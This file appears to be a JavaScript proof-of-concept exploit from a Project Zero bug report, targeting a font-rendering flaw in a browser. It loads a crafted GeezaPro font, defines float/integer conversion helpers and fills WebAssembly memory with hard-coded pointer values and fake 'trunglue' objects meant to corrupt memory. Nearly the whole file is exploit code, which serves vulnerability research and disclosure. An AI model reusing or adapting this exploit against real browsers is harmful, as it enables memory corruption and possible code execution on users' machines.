// https://bugs.chromium.org/p/project-zero/issues/attachmentText?aid=474948
function pig() {
    var ctx = canvas.getContext('2d');
    ctx.font = '24px GeezaPro';
    ctx.fillText('من ويكيبيديا، الموسوعة الحرة', 400, 200);
}

/**
 * Utils
 */
let conversion_buffer = new ArrayBuffer(8);
let float_view = new Float64Array(conversion_buffer);
let int_view = new BigUint64Array(conversion_buffer);
BigInt.prototype.hex = function () {
    return '0x' + this.toString(16);
};
BigInt.prototype.i2f = function () {
    int_view[0] = this;
    return float_view[0];
}
Number.prototype.f2i = function () {
    float_view[0] = this;
    return int_view[0];
}

function start(wasm_func, memory) {
    const pocFontFace = new FontFace("GeezaPro", "url(poc.ttf)")

    var canvas = document.getElementById('canvas')
    canvas.setAttribute("style", "font-family: GeezaPro; -webkit-font-smoothing: none;")

    pocFontFace.load().then(function (pocFontFaceLoaded) {
        document.fonts.add(pocFontFaceLoaded)
        document.fonts.ready.then(function () {
            var trunglue = {
                a: 1,
                b: 2,
                c: 3,
                d: 4,
                e: 5,
                f: 6,
                g: 7,
                h: 8,
                i: 9,
                j: 10,
                k: 11,
                l: 12,
                m: 13,
                n: 14,
                o: 15,
                p: 16,
                q: 17,
                r: 18,
                s: false,   // something that must be small (trunglue+0xa0 - encoded_index)
                t: 20,
                u: {},      // something that must be mapped (trunglue+0xb0 - glyphs)
                v: 22
            }
            const array = new Float64Array(memory.buffer, 0, 100)
            array.set([
                BigInt("0").i2f(),
                BigInt("1").i2f(),
                BigInt("2").i2f(),
                BigInt("3").i2f(),
                BigInt("4").i2f(),
                BigInt("5").i2f(),
                BigInt("6").i2f(),
                BigInt("7").i2f(),
                BigInt("8").i2f(),
                BigInt("9").i2f(),
                BigInt("10").i2f(),
                BigInt("500").i2f(),
                BigInt("12").i2f(),
                BigInt("0x00007FFF8E200038").i2f(),
                BigInt("14").i2f(),
                BigInt("15").i2f(),
                BigInt("16").i2f(),
                BigInt("17").i2f(),
                BigInt("18").i2f(),
                BigInt("19").i2f(),
                BigInt("20").i2f(),
                BigInt("21").i2f(),
                BigInt("22").i2f(),
                BigInt("23").i2f(),
                BigInt("24").i2f(),
                BigInt("25").i2f(),
                BigInt("0x131337").i2f(),                    // location 1
                BigInt("0x00007FFF8E200038").i2f(),     // trunglue 1
                BigInt("0x131338").i2f(),                 // location 2
                BigInt("0x00007FFF8E200038").i2f(),     // trunglue 2
                BigInt("0x131337").i2f(),                    // location 3
                BigInt("0x00007FFF8E200038").i2f(),     // trunglue 3
                BigInt("0x131338").i2f(),                // location 4
                BigInt("0x00007FFF8E200038").i2f(),     // trunglue 4
                BigInt("0x131339").i2f(),                  // location 5
                BigInt("0x00007FFF8E200038").i2f(),     // trunglue 5
            ])
            wasm_func(array.byteOffset)
        })
    })
}